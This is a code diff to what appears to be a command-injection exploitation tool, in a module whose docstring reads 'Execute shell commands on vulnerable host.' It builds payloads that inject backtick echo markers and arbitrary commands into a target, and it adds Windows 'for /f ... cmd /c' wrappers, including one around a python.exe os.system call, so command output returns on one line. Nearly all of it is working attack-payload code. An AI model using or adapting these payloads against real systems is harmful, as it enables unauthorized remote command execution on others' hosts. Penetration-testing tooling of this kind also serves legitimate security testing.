@@ -102,6 +102,10 @@ Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, TAG, cmd):
   if settings.TARGET_OS == "win":
+    cmd = ( "for /f \"delims=\" %i in ('cmd /c " + 
+            cmd +
+            "') do @set /p =%i <nul"
+          )
     if separator == "":
       payload = ("print(`echo " + TAG + "`." + 
                   "`echo " + TAG + "`." +
@@ -109,6 +113,7 @@ def cmd_execution(separator, TAG, cmd):
                   "`echo " + TAG + "`." +
                   "`echo " + TAG + "`)%3B"
                 )
+
     else:
       payload = ("print(`echo '" + TAG + "'" + 
                   separator + "echo '" + TAG + "'" +
@@ -143,7 +148,11 @@ def cmd_execution_alter_shell(separator, TAG, cmd):
       payload = (separator + " " + cmd + " "
                 )
     else:
-      python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"import os; os.system('" +cmd+ "')\"" 
+      python_payload = ("for /f \"delims=\" %i in ('cmd /c " + 
+                        settings.WIN_PYTHON_DIR + "python.exe -c \"import os; os.system('" + cmd + "')\"" + 
+                        "') do @set /p =%i <nul"
+                       )
+
       if separator == "":
         payload = ("print(`echo " + TAG + "`." + 
                     "`echo " + TAG + "`." +
